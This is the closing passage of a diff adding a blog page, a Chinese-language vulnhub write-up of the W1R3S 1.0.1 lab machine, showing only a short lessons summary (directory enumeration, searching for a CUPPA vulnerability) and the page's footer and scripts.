class="string"></span></span><br><span class="line"><span class="string">CREATED BY SpecterWires</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub131.jpg"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li>枚举目录的能力-此技能可以节省大量时间，因为在许多情况下，会发现有趣的路径充当入口点。</li>
+<li>能够搜索运行服务的漏洞-在这种情况下，设法通过一个简单的Google搜索就发现了CUPPA漏洞。利用漏洞数据库和Google之类的搜索引擎可以节省大量时间。</li>
+</ul>
+<p><font color="red">Game over</font></p>
+<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
+<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/01/03/W1R3S-1-0-1/" title="vulnhub靶机渗透[W1R3S-1-0-1]">https://fdlucifer.github.io/2020/01/03/W1R3S-1-0-1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/01/02/Mr-Robot-1/" rel="prev" title="vulnhub靶机渗透[Mr-Robot-1]">
+                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[Mr-Robot-1]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/01/08/GoldenEye-1/" rel="next" title="vulnhub靶机渗透[GoldenEye-1]">
+                  vulnhub靶机渗透[GoldenEye-1] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
